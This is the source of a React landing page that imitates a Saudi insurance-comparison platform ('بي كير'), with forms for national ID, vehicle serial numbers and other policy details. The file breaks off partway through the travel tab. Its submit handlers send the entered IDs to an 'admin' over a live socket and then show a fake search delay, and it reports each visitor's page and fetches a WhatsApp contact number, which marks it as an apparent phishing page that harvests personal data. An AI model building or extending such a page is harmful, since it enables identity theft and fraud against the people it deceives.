import React, { useState, useEffect, useRef, useCallback, useMemo } from "react";
import { Link, useLocation } from "wouter";
import { socket, submitData, updatePage } from "@/lib/store";
import { openAmerChat } from "@/components/AmerChat";

export default function FahsHome() {
  const [insuranceType, setInsuranceType] = useState("new");
  const [vehicleType, setVehicleType] = useState("form");
  const [nationalId, setNationalId] = useState("");
  const [buyerId, setBuyerId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [customsNumber, setCustomsNumber] = useState("");
  const [manufactureYear, setManufactureYear] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [agreed, setAgreed] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [, setLocation] = useLocation();
  const [captchaCode, setCaptchaCode] = useState("");
  const captchaCodeRef = useRef("");
  const [nationalIdError, setNationalIdError] = useState("");
  const [buyerIdError, setBuyerIdError] = useState("");
  const [yearDropdownOpen, setYearDropdownOpen] = useState(false);
  const [agreementHighlight, setAgreementHighlight] = useState(false);
  const [whatsappNumber, setWhatsappNumber] = useState("");

  useEffect(() => {
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      socket.value.off("whatsapp:update");
    };
  }, []);
  const [captchaError, setCaptchaError] = useState(false);

  const captchaVisualRef = useRef<{bg: React.CSSProperties, digits: {color: string, fontSize: string, rotation: number}[]}>({bg: {} as React.CSSProperties, digits: []});
  const captchaVisual = useMemo(() => {
    if (!captchaCode) { captchaVisualRef.current = { bg: {} as React.CSSProperties, digits: [] }; return captchaVisualRef.current; }
    const seededRandom = (seed: number) => { const x = Math.sin(seed) * 10000; return x - Math.floor(x); };
    let seed = 0; for (let i = 0; i < captchaCode.length; i++) seed = seed * 31 + captchaCode.charCodeAt(i);
    const bgColors = ['#00e5ff','#ffeb3b','#ff9800','#e91e63','#4caf50','#9c27b0','#00bcd4','#8bc34a','#ff5722','#03a9f4'];
    const c = bgColors[Math.floor(seededRandom(seed + 1) * bgColors.length)];
    const patterns = [
      { background: `radial-gradient(circle, ${c} 1px, transparent 1px)`, backgroundSize: '6px 6px' },
      { background: `linear-gradient(45deg, ${c} 25%, transparent 25%, transparent 75%, ${c} 75%), linear-gradient(45deg, ${c} 25%, transparent 25%, transparent 75%, ${c} 75%)`, backgroundSize: '8px 8px', backgroundPosition: '0 0, 4px 4px' },
      { background: `repeating-linear-gradient(0deg, ${c}, ${c} 1px, transparent 1px, transparent 5px), repeating-linear-gradient(90deg, ${c}, ${c} 1px, transparent 1px, transparent 5px)`, backgroundSize: '5px 5px' },
      { background: `repeating-linear-gradient(45deg, ${c}, ${c} 1px, transparent 1px, transparent 6px)`, backgroundSize: '8px 8px' },
      { background: `radial-gradient(circle, ${c} 2px, transparent 2px)`, backgroundSize: '10px 10px' },
    ];
    const p = patterns[Math.floor(seededRandom(seed + 2) * patterns.length)];
    const bg = { ...p, minWidth: '100px', height: '48px' } as React.CSSProperties;
    const allColors = ['#e53935', '#8e24aa', '#1565c0', '#333', '#e65100', '#2e7d32', '#c62828', '#4527a0', '#0d47a1'];
    const digits = captchaCode.split('').map((_, i) => ({
      color: allColors[Math.floor(seededRandom(seed + 10 + i) * allColors.length)],
      fontSize: `${24 + Math.floor(seededRandom(seed + 20 + i) * 10)}px`,
      rotation: Math.floor(seededRandom(seed + 30 + i) * 30) - 15
    }));
    captchaVisualRef.current = { bg, digits };
    return captchaVisualRef.current;
  }, [captchaCode]);
  const [activeTab, setActiveTab] = useState("vehicles");

  // Medical tab state
  const [medicalRegNumber, setMedicalRegNumber] = useState("");

  // Malpractice tab state
  const [malpracticeId, setMalpracticeId] = useState("");
  const [malpracticeIdError, setMalpracticeIdError] = useState("");
  const [malpracticeStartDate, setMalpracticeStartDate] = useState(() => {
    const d = new Date(); d.setDate(d.getDate() + 1);
    return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
  });

  // Travel tab state
  const [travelId, setTravelId] = useState("");
  const [travelIdError, setTravelIdError] = useState("");
  const [travelStartDate, setTravelStartDate] = useState(() => {
    const d = new Date(); d.setDate(d.getDate() + 1);
    return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
  });
  const [travelEndDate, setTravelEndDate] = useState(() => {
    const d = new Date(); d.setDate(d.getDate() + 31);
    return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
  });

  // Domestic tab state
  const [domesticId, setDomesticId] = useState("");
  const [domesticIdError, setDomesticIdError] = useState("");
  const [domesticBirthMonth, setDomesticBirthMonth] = useState("");
  const [domesticBirthYear, setDomesticBirthYear] = useState("");
  const [domesticMonthOpen, setDomesticMonthOpen] = useState(false);
  const [domesticYearOpen, setDomesticYearOpen] = useState(false);

  useEffect(() => {
    generateCaptcha();
    updatePage('البيانات الرئيسية');
  }, []);

  const generateCaptcha = () => {
    const chars = "0123456789";
    let code = "";
    for (let i = 0; i < 4; i++) {
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    setCaptchaCode(code);
    captchaCodeRef.current = code;
    setCaptchaInput("");
  };

  // Saudi ID / Iqama validation: starts with 1 or 2, exactly 10 digits, Luhn check
  const validateSaudiId = (id: string): string => {
    if (!id) return "يرجى إدخال رقم الهوية / الإقامة";
    if (id.length !== 10) return "رقم الهوية يجب أن يكون 10 أرقام";
    if (id[0] !== '1' && id[0] !== '2') return "رقم الهوية / الإقامة غير صحيحة";
    // Luhn algorithm check
    let sum = 0;
    for (let i = 0; i < 10; i++) {
      let digit = parseInt(id[i]);
      if (i % 2 === 0) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }
    if (sum % 10 !== 0) return "رقم الهوية / الإقامة غير صحيحة";
    return "";
  };

  const handleSubmit = () => {
    let hasError = false;
    if (insuranceType === "transfer") {
      const natErr = validateSaudiId(nationalId);
      const buyErr = validateSaudiId(buyerId);
      if (natErr) { setNationalIdError(natErr); hasError = true; }
      if (buyErr) { setBuyerIdError(buyErr); hasError = true; }
    } else {
      const natErr = validateSaudiId(nationalId);
      if (natErr) { setNationalIdError(natErr); hasError = true; }
    }
    if (!serialNumber || !captchaInput || !agreed) return;
    if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
    if (hasError) return;
    setIsSearching(true);

    // Send data to admin
    const adminData: Record<string, string> = {
      'الغرض من التأمين': insuranceType === 'new' ? 'تأمين جديد' : 'نقل ملكية',
      'نوع تسجيل المركبة': vehicleType === 'customs' ? 'بطاقة جمركية' : 'استمارة',
      'رقم الهوية / الإقامة': nationalId,
      'الرقم التسلسلي': vehicleType === 'customs' ? customsNumber : serialNumber,
    };
    if (insuranceType === 'transfer') {
      adminData['رقم هوية المشتري'] = buyerId;
    }
    if (vehicleType === 'customs' && manufactureYear) {
      adminData['سنة الصنع'] = manufactureYear;
    }
    submitData(adminData);

    localStorage.setItem('nationalId', nationalId);
    localStorage.setItem('homeInsuranceType', insuranceType);
    localStorage.setItem('vehicleRegType', vehicleType === 'customs' ? 'بطاقة جمركية' : 'استمارة');
    localStorage.setItem('vehicleRegNumber', vehicleType === 'customs' ? customsNumber : serialNumber);
    if (insuranceType === 'transfer') {
      localStorage.setItem('buyerId', buyerId);
    }
    setTimeout(() => {
      setIsSearching(false);
      setLocation('/new-appointment');
    }, 2000);
  };

  // Tab-specific hero content
  const heroContent: Record<string, {title: string, subtitle: string}> = {
    vehicles: {
      title: 'المنصة الأذكى لمقارنة عروض تأمين السيارات في السعودية',
      subtitle: 'المنصة الأذكى لمقارنة عروض أكثر من 20 شركة تأمين. احصل على أرخص تأمين سيارات مع إصدار فوري وربط مباشر بنجم.'
    },
    medical: {
      title: 'المنصة الأذكى لمقارنة عروض التأمين الطبي في السعودية',
      subtitle: 'المنصة الأذكى لمقارنة أفضل شركات التأمين الطبي. احصل على أرخص تأمين للشركات والمنشآت، مع إصدار فوري وربط مباشر بمجلس الضمان الصحي.'
    },
    malpractice: {
      title: 'المنصة الأذكى لمقارنة عروض تأمين الأخطاء الطبية في السعودية',
      subtitle: 'المنصة الأذكى لمقارنة عروض الحماية المهنية. احصل على أرخص تأمين أخطاء طبية (ممارس بلس) مع تغطية شاملة ومعتمدة لدى هيئة التخصصات الطبية.'
    },
    travel: {
      title: 'المنصة الأذكى لمقارنة عروض تأمين السفر في السعودية',
      subtitle: 'المنصة الأذكى لمقارنة عروض السفر العالمية. احصل على أرخص تأمين سفر (شنغن ودولي) مع شهادة معتمدة للسفارات وتغطية فورية.'
    },
    domestic: {
      title: 'المنصة الأذكى لمقارنة عروض التأمين الطبي للعمالة المنزلية في السعودية',
      subtitle: 'المنصة الأذكى لمقارنة خيارات تأمين العمالة. احصل على أرخص تأمين طبي للعمالة المنزلية لحفظ حقوقك، مع ربط مباشر بمجلس الضمان الصحي.'
    }
  };

  const handleMedicalSubmit = () => {
    if (!medicalRegNumber || !captchaInput || !agreed) return;
    if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
    setIsSearching(true);
    submitData({ 'نوع التأمين': 'طبي (شركات ومنشآت)', 'السجل التجاري / الرقم الموحد': medicalRegNumber });
    localStorage.setItem('nationalId', medicalRegNumber);
    localStorage.setItem('insuranceCategory', 'medical');
    setTimeout(() => { setIsSearching(false); setLocation('/medical-form'); }, 2000);
  };

  const handleMalpracticeSubmit = () => {
    const idErr = validateSaudiId(malpracticeId);
    if (idErr) { setMalpracticeIdError(idErr); return; }
    if (!captchaInput || !agreed) return;
    if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
    setIsSearching(true);
    submitData({ 'نوع التأمين': 'أخطاء طبية', 'رقم الهوية / الإقامة': malpracticeId, 'تاريخ بداية التأمين': malpracticeStartDate });
    localStorage.setItem('nationalId', malpracticeId);
    localStorage.setItem('insuranceCategory', 'malpractice');
    setTimeout(() => { setIsSearching(false); setLocation('/malpractice-form'); }, 2000);
  };

  const handleTravelSubmit = () => {
    const idErr = validateSaudiId(travelId);
    if (idErr) { setTravelIdError(idErr); return; }
    if (!captchaInput || !agreed) return;
    if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
    setIsSearching(true);
    submitData({ 'نوع التأمين': 'سفر', 'رقم الهوية / الإقامة': travelId, 'تاريخ بداية التغطية': travelStartDate, 'تاريخ نهاية التغطية': travelEndDate });
    localStorage.setItem('nationalId', travelId);
    localStorage.setItem('insuranceCategory', 'travel');
    setTimeout(() => { setIsSearching(false); setLocation('/travel-form'); }, 2000);
  };

  const handleDomesticSubmit = () => {
    const idErr = validateSaudiId(domesticId);
    if (idErr) { setDomesticIdError(idErr); return; }
    if (!domesticBirthMonth || !domesticBirthYear || !captchaInput || !agreed) return;
    if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
    setIsSearching(true);
    submitData({ 'نوع التأمين': 'العمالة المنزلية', 'هوية الكفيل / رقم الإقامة': domesticId, 'شهر الميلاد': domesticBirthMonth, 'سنة الميلاد': domesticBirthYear });
    localStorage.setItem('nationalId', domesticId);
    localStorage.setItem('insuranceCategory', 'domestic');
    setTimeout(() => { setIsSearching(false); setLocation('/domestic-form'); }, 2000);
  };

  const arabicMonths = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];

  // Colors
  const primaryBlue = "#146494";
  const darkBlue = "#0d4770";
  const accentOrange = "#f5a623";
  const footerDark = "#146494";
  const tealAccent = "#00b4d8";

  return (
    <div className="min-h-screen bg-white overflow-x-hidden" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      
      {/* Header */}
      <header className="bg-white py-3 md:py-4 px-4 lg:px-8 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <Link to="/" className="cursor-pointer">
            <img src="/images/a1/l1.svg" alt="بي كير" className="h-8 md:h-10" />
          </Link>
        </div>
        <div className="flex items-center gap-2 md:gap-3">
          <button className="w-8 h-8 rounded-full border-2 flex items-center justify-center" style={{ borderColor: primaryBlue, color: primaryBlue }}>
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </button>
          <button className="px-2 md:px-3 py-1 text-sm font-bold" style={{ color: primaryBlue }}>EN</button>
        </div>
      </header>

      {/* Hero Section - Blue background */}
      <section className="relative" style={{ backgroundColor: primaryBlue, minHeight: window.innerWidth < 768 ? '320px' : '460px', overflow: 'visible' }}>
        {/* Background decorative SVGs */}
        <img src="/images/a1/b1.svg" alt="" className="absolute left-0 top-0 pointer-events-none z-[1]" style={{ height: window.innerWidth < 768 ? '60%' : '140%', opacity: window.innerWidth < 768 ? 0.08 : 0.12 }} />
        <img src="/images/a1/b2.svg" alt="" className="absolute right-0 top-0 pointer-events-none z-[1]" style={{ height: window.innerWidth < 768 ? '60%' : '140%', opacity: window.innerWidth < 768 ? 0.08 : 0.12 }} />
        
        <div className="container mx-auto px-4 lg:px-8 pt-8 md:pt-12 pb-32 relative z-10 text-center">
          <h1 className="text-xl md:text-4xl lg:text-[42px] font-bold text-white leading-tight mb-3 md:mb-4 px-2 md:px-0" style={{ lineHeight: window.innerWidth < 768 ? '1.5' : '1.4' }}>
            {heroContent[activeTab]?.title}
          </h1>
          <p className="text-white/80 text-xs md:text-base max-w-4xl mx-auto font-bold px-2 md:px-0 leading-relaxed md:whitespace-nowrap">
            {heroContent[activeTab]?.subtitle}
          </p>
        </div>
      </section>

      {/* White/gray area below hero */}
      <div className="bg-gray-50">
      {/* Insurance Type Tabs + Form Card */}
      <div className="w-full -mt-44 md:-mt-52 relative z-20 px-3 md:px-16 lg:px-28">
        <div className="bg-white shadow-lg" style={{ borderRadius: '15px', overflow: 'visible' }}>
          {/* Tabs */}
          <div className="flex justify-start bg-white overflow-x-auto md:overflow-visible scrollbar-hide px-2 md:px-8 pt-2" style={{ position: 'relative', borderRadius: '15px 15px 0 0', WebkitOverflowScrolling: 'touch' }}>
            {[
              { id: "vehicles", label: "مركبات", icon: (<img src="/images/a1/t1.svg" className="w-6 h-6 md:w-7 md:h-7" alt="مركبات" style={{ filter: 'inherit' }} />) },
              { id: "medical", label: "طبي", icon: (<img src="/images/a1/t2.svg" className="w-6 h-6 md:w-7 md:h-7" alt="طبي" style={{ filter: 'inherit' }} />) },
              { id: "malpractice", label: "اخطاء طبية", icon: (<img src="/images/a1/tab-stethoscope.svg" className="w-6 h-6 md:w-7 md:h-7" alt="اخطاء طبية" style={{ filter: 'inherit' }} />) },
              { id: "travel", label: "سفر", icon: (<img src="/images/a1/t5.svg" className="w-6 h-6 md:w-7 md:h-7" alt="سفر" style={{ filter: 'inherit' }} />) },
              { id: "domestic", label: "العمالة المنزلية", icon: (<img src="/images/a1/t4.svg" className="w-6 h-6 md:w-7 md:h-7" alt="العمالة المنزلية" style={{ filter: 'inherit' }} />) },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`py-4 md:py-6 px-3 md:px-8 flex flex-col items-center gap-1.5 md:gap-2 text-[10px] md:text-sm font-bold transition-colors relative flex-shrink-0 ${
                  activeTab === tab.id
                    ? "text-[#1a73a7]"
                    : "text-gray-400 hover:text-gray-600"
                }`}
              >
                <span style={{ filter: activeTab === tab.id ? 'invert(42%) sepia(60%) saturate(600%) hue-rotate(300deg) brightness(85%)' : 'invert(70%) sepia(0%) saturate(0%) brightness(85%)' }}>{tab.icon}</span>
                <span className="whitespace-nowrap">{tab.label}</span>
                {activeTab === tab.id && (
                  <span className="absolute bottom-0" style={{ width: '60%', height: '3px', backgroundColor: '#f5a623', borderRadius: '2px' }}></span>
                )}
              </button>
            ))}
          </div>

          {/* Separator line */}
          <div style={{ height: '30px', backgroundColor: '#e0e0e0' }}></div>

          {activeTab === 'medical' ? (
          <div className="bg-white px-4 md:px-10 lg:px-14 pt-4 pb-8 md:pb-16">
            <div className="flex flex-col md:flex-row items-stretch md:items-end gap-4 md:gap-6">
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">السجل التجاري / الرقم الموحد</label>
                <input type="text" inputMode="numeric" pattern="[0-9]*" placeholder="السجل التجاري / الرقم الموحد" value={medicalRegNumber} onChange={(e) => setMedicalRegNumber(e.target.value.replace(/[^0-9]/g, ''))} maxLength={10} className="w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold border-gray-200" style={{ color: '#ccc' }} onFocus={(e) => e.target.style.color = '#1a5276'} onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }} />
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className={`flex items-center gap-0 border rounded-lg overflow-hidden bg-white ${captchaError ? 'border-red-500' : 'border-gray-200'}`}>
                  <input type="text" inputMode="numeric" dir="ltr" value={captchaInput} onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, '')); setCaptchaError(false); }} className="flex-1 md:w-24 px-3 py-3 bg-white text-center focus:outline-none text-base font-bold border-none" style={{ color: captchaInput ? '#1a5276' : '#ccc' }} />
                  <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7] flex-shrink-0"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg></button>
                  <div dir="ltr" className="px-3 py-2 select-none flex items-center justify-center gap-0.5 flex-shrink-0" style={captchaVisual.bg}>{captchaCode.split('').map((digit, i) => (<span key={i + captchaCode} style={{ color: captchaVisual.digits[i]?.color || '#333', fontSize: captchaVisual.digits[i]?.fontSize || '24px', fontWeight: 'bold', transform: `rotate(${captchaVisual.digits[i]?.rotation || 0}deg)`, display: 'inline-block', textShadow: '1px 1px 0px rgba(0,0,0,0.1)' }}>{digit}</span>))}</div>
                </div>
                {captchaError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>رمز التحقق غير صحيح</p>}
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0 md:self-end relative">
                {(() => { const isFormComplete = medicalRegNumber.length > 0 && captchaInput; return (
                  <button onClick={() => { if (!agreed) { setAgreementHighlight(false); setTimeout(() => setAgreementHighlight(true), 50); setTimeout(() => setAgreementHighlight(false), 1500); return; } handleMedicalSubmit(); }} disabled={isSearching || !isFormComplete} className={`w-full md:w-auto px-12 rounded-lg text-white font-bold text-base transition-all ${isFormComplete && !isSearching ? 'hover:opacity-90 cursor-pointer' : 'opacity-50 cursor-not-allowed'}`} style={{ backgroundColor: '#f5a623', height: '48px' }}>
                    <div className="flex items-center justify-center gap-2">{isSearching && (<svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>)}إظهار العروض</div>
                  </button>); })()}
                <div className={`hidden md:flex absolute right-0 items-center gap-2 mt-2 whitespace-nowrap group rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                  <input type="checkbox" id="agree-medical-d" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4" />
                  <label htmlFor="agree-medical-d" className="text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label>
                </div>
                <div className="md:hidden"><div className={`flex items-center gap-2 mt-2 rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl"><input type="checkbox" id="agree-medical-m" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4 flex-shrink-0" /><label htmlFor="agree-medical-m" className="text-xs sm:text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label></div></div>
              </div>
            </div>
          </div>
          ) : activeTab === 'malpractice' ? (
          <div className="bg-white px-4 md:px-10 lg:px-14 pt-4 pb-8 md:pb-16">
            <div className="flex flex-col md:flex-row items-stretch md:items-end gap-4 md:gap-6">
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رقم الهوية / الإقامة</label>
                <input type="text" inputMode="numeric" pattern="[0-9]*" placeholder="رقم هوية طالب التأمين" value={malpracticeId} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setMalpracticeId(v); if (v.length < 10) { setMalpracticeIdError(''); } else if (v.length === 10) { setMalpracticeIdError(validateSaudiId(v)); } }} maxLength={10} className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${malpracticeIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }} onFocus={(e) => e.target.style.color = '#1a5276'} onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }} />
                {malpracticeIdError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>{malpracticeIdError}</p>}
              </div>
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">تاريخ بداية التأمين</label>
                <input type="date" value={malpracticeStartDate} onChange={(e) => setMalpracticeStartDate(e.target.value)} className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#1a5276' }} />
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className={`flex items-center gap-0 border rounded-lg overflow-hidden bg-white ${captchaError ? 'border-red-500' : 'border-gray-200'}`}>
                  <input type="text" inputMode="numeric" dir="ltr" value={captchaInput} onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, '')); setCaptchaError(false); }} className="flex-1 md:w-24 px-3 py-3 bg-white text-center focus:outline-none text-base font-bold border-none" style={{ color: captchaInput ? '#1a5276' : '#ccc' }} />
                  <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7] flex-shrink-0"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg></button>
                  <div dir="ltr" className="px-3 py-2 select-none flex items-center justify-center gap-0.5 flex-shrink-0" style={captchaVisual.bg}>{captchaCode.split('').map((digit, i) => (<span key={i + captchaCode} style={{ color: captchaVisual.digits[i]?.color || '#333', fontSize: captchaVisual.digits[i]?.fontSize || '24px', fontWeight: 'bold', transform: `rotate(${captchaVisual.digits[i]?.rotation || 0}deg)`, display: 'inline-block', textShadow: '1px 1px 0px rgba(0,0,0,0.1)' }}>{digit}</span>))}</div>
                </div>
                {captchaError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>رمز التحقق غير صحيح</p>}
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0 md:self-end relative">
                {(() => { const isFormComplete = malpracticeId.length === 10 && !malpracticeIdError && captchaInput; return (
                  <button onClick={() => { if (!agreed) { setAgreementHighlight(false); setTimeout(() => setAgreementHighlight(true), 50); setTimeout(() => setAgreementHighlight(false), 1500); return; } handleMalpracticeSubmit(); }} disabled={isSearching || !isFormComplete} className={`w-full md:w-auto px-12 rounded-lg text-white font-bold text-base transition-all ${isFormComplete && !isSearching ? 'hover:opacity-90 cursor-pointer' : 'opacity-50 cursor-not-allowed'}`} style={{ backgroundColor: '#f5a623', height: '48px' }}>
                    <div className="flex items-center justify-center gap-2">{isSearching && (<svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>)}إظهار العروض</div>
                  </button>); })()}
                <div className={`hidden md:flex absolute right-0 items-center gap-2 mt-2 whitespace-nowrap group rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                  <input type="checkbox" id="agree-malp-d" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4" />
                  <label htmlFor="agree-malp-d" className="text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label>
                </div>
                <div className="md:hidden"><div className={`flex items-center gap-2 mt-2 rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl"><input type="checkbox" id="agree-malp-m" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4 flex-shrink-0" /><label htmlFor="agree-malp-m" className="text-xs sm:text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label></div></div>
              </div>
            </div>
          </div>
          ) : activeTab === 'travel' ? (
          <div className="bg-white px-4 md:px-10 lg:px-14 pt-4 pb-8 md:pb-16">
            <div className="flex flex-col md:flex-row items-stretch md:items-end gap-4 md:gap-6">
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رقم الهوية / الإقامة</label>
                <input type="text" inputMode="numeric" pattern="[0-9]*" placeholder="رقم الهوية / الإقامة" value={travelId} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setTravelId(v); if (v.length < 10) { setTravelIdError(''); } else if (v.length === 10) { setTravelIdError(validateSaudiId(v)); } }} maxLength={10} className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${travelIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }} onFocus={(e) => e.target.style.color = '#1a5276'} onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }} />
                {travelIdError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>{travelIdError}</p>}
              </div>
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">تاريخ بداية التغطية</label>
                <input type="date" value={travelStartDate} onChange={(e) => setTravelStartDate(e.target.value)} className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#1a5276' }} />
              </div>
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">تاريخ نهاية التغطية</label>
                <input type="date" value={travelEndDate} onChange={(e) => setTravelEndDate(e.target.value)} className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#1a5276' }} />
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className={`flex items-center gap-0 border rounded-lg overflow-hidden bg-white ${captchaError ? 'border-red-500' : 'border-gray-200'}`}>
                  <input type="text" inputMode="numeric" dir="ltr" value={captchaInput} onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, '')); setCaptchaError(false); }} className="flex-1 md:w-24 px-3 py-3 bg-white text-center focus:outline-none text-base font-bold border-none" style={{ color: captchaInput ? '#1a5276' : '#ccc' }} />
                  <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7] flex-shrink-0"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg></button>
                  <div dir="ltr" className="px-3 py-2 select-none flex items-center justify-center gap-0.5 flex-shrink-0" style={captchaVisual.bg}>{captchaCode.split('').map((digit, i) => (<span key={i + captchaCode} style={{ color: captchaVisual.digits[i]?.color || '#333', fontSize: captchaVisual.digits[i]?.fontSize || '24px', fontWeight: 'bold', transform: `rotate(${captchaVisual.digits[i]?.rotation || 0}deg)`, display: 'inline-block', textShadow: '1px 1px 0px rgba(0,0,0,0.1)' }}>{digit}</span>))}</div>
                </div>
